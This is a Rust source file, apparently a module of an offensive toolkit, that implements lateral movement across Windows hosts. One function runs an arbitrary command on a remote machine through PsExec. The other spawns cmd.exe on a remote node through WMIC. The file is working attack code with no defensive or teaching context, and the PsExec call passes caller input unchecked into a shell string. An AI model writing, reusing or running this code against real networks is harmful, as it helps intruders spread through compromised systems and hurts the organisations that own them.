use std::process::Command;

pub struct LateralMovement;

impl LateralMovement {
    #[cfg(target_os = "windows")]
    pub fn psexec_movement(target_host: &str, command: &str) -> Result<(), String> {
        let output = Command::new("cmd")
            .args(&[
                "/c",
                &format!("psexec \\\\{} {}", target_host, command),
            ])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    Ok(())
                } else {
                    Err(format!("PsExec failed on host: {}", target_host))
                }
            }
            Err(e) => Err(format!("PsExec execution failed: {}", e)),
        }
    }

    #[cfg(target_os = "windows")]
    pub fn wmi_lateral_movement(target_host: &str) -> Result<(), String> {
        let node_arg = format!("/node:{}", target_host);
        let output = Command::new("wmic")
            .args(&[
                &node_arg,
                "process",
                "call",
                "create",
                "cmd.exe",
            ])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    Ok(())
                } else {
                    Err("WMI lateral movement failed".to_string())
                }
            }
            Err(e) => Err(format!("WMI execution failed: {}", e)),
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn psexec_movement(_target_host: &str, _command: &str) -> Result<(), String> {
        Err("PsExec not available on non-Windows systems".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn wmi_lateral_movement(_target_host: &str) -> Result<(), String> {
        Err("WMI not available on non-Windows systems".to_string())
    }
}
